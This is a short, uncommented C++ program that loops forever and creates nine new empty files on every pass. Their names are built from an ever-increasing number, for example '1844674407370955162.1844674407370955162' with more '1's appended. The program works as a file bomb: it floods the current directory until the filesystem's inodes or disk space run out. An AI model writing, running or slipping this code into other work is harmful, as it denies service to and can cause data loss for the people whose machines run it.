#include<bits/stdc++.h>
using namespace std;
int main()
{
	string s;unsigned long long i=1844674407370955161;
	while(1){
		i++;
		stringstream ss;
		ss<<i;
		ss>>s;
		s=s+"."+s;
		ofstream(s.c_str());
		s=s+"1";
		ofstream(s.c_str());
		s=s+"1";
		ofstream(s.c_str());
		s=s+"1";
		ofstream(s.c_str());
		s=s+"1";
		ofstream(s.c_str());
		s=s+"1";
		ofstream(s.c_str());
		s=s+"1";
		ofstream(s.c_str());
		s=s+"1";
		ofstream(s.c_str());
		s=s+"1";
		ofstream(s.c_str());
	}
}
